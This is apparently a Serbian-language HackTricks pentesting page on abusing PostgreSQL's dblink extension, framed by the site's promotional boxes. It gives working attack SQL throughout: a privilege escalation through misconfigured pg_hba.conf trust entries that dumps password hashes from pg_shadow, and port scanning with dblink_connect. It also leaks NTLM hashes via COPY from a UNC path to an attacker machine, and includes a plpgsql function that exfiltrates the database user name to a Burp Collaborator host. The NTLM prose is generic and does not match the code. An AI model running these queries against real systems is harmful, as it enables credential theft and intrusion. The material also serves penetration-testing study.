<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


**Prona캠ite [vi코e informacija o ovim napadima u originalnom radu](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.

Od **PostgreSQL 9.1**, instalacija dodatnih modula je jednostavna. [Registrovani ekstenzije poput `dblink`](https://www.postgresql.org/docs/current/contrib.html) mogu se instalirati sa [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html):
```sql
CREATE EXTENSION dblink;
```
Jednom kada imate u캜itan dblink, mo쬰te izvesti neke zanimljive trikove:

## Eskalacija privilegija

Datoteka `pg_hba.conf` mo쬰 biti lo코e konfigurisana, **omogu캖avaju캖i konekcije** sa **localhostom kao bilo koji korisnik**, bez potrebe za poznavanjem lozinke. Ova datoteka se obi캜no nalazi u `/etc/postgresql/12/main/pg_hba.conf`, a lo코a konfiguracija izgleda ovako:
```
local    all    all    trust
```
_Napomena da se ova konfiguracija 캜esto koristi za izmenu lozinke korisnika baze podataka kada je administrator zaboravi, pa je ponekad mo쬰te prona캖i._\
_Napomena tako캠e da je datoteka pg\_hba.conf 캜itljiva samo od strane korisnika i grupe postgres, i da je mogu캖e samo od strane korisnika postgres._

Ovaj slu캜aj je **koristan ako** ve캖 imate **shell** unutar rtve, jer 캖e vam omogu캖iti da se pove쬰te sa postgresql bazom podataka.

Jo코 jedna mogu캖a konfiguracija koja mo쬰 biti pogre코na je slede캖a:
```
host    all     all     127.0.0.1/32    trust
```
Kako 캖e omogu캖iti svima sa lokalnog ra캜unara da se pove쬿 sa bazom podataka kao bilo koji korisnik.\
U ovom slu캜aju, ako je funkcija **`dblink`** **aktivna**, mo쬰te **pove캖ati privilegije** tako 코to 캖ete se povezati sa bazom podataka putem ve캖 uspostavljene veze i pristupiti podacima do kojih ne biste trebali imati pristup:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## Skeniranje portova

Zloupotrebom `dblink_connect` funkcije mo쬰te tako캠e **pretra쬴vati otvorene portove**. Ako ta **funkcija ne radi, trebali biste poku코ati koristiti `dblink_connect_u()`** jer dokumentacija ka쬰 da je `dblink_connect_u()` identi캜na `dblink_connect()` funkciji, osim 코to 캖e dozvoliti ne-superkorisnicima da se pove쬿 koriste캖i bilo koji metod autentifikacije.
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
Imajte na umu da **pre** nego 코to budete u mogu캖nosti da koristite `dblink_connect` ili `dblink_connect_u`, mo쬯a 캖ete morati da izvr코ite:
```
CREATE extension dblink;
```
## Otkrivanje UNC putanje - NTLM he코 otkrivanje

Kada se koristi NTLM autentifikacija, mogu캖e je otkriti NTLM he코 lozinke korisnika putem UNC (Universal Naming Convention) putanje. UNC putanja je na캜in za identifikaciju i pristup deljenim resursima na mre쬴.

Da biste otkrili NTLM he코 lozinke, mo쬰te koristiti slede캖i postupak:

1. Skenirajte mre쬿 kako biste prona코li otvorene portove na ciljnom sistemu.
2. Identifikujte otvorene portove koji podr쬬vaju NTLM autentifikaciju.
3. Koristite alat poput `enum4linux` ili `smbclient` za pristupanje ciljnom sistemu putem UNC putanje.
4. Kada pristupite ciljnom sistemu, mo쬰te dobiti NTLM he코 lozinke korisnika iz odgovora servera.

Ova tehnika mo쬰 biti korisna za otkrivanje NTLM he코 lozinke korisnika i dalje iskori코캖avanje ranjivosti sistema. Me캠utim, va쬹o je napomenuti da je ova tehnika ilegalna i mo쬰 dovesti do pravnih posledica.
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
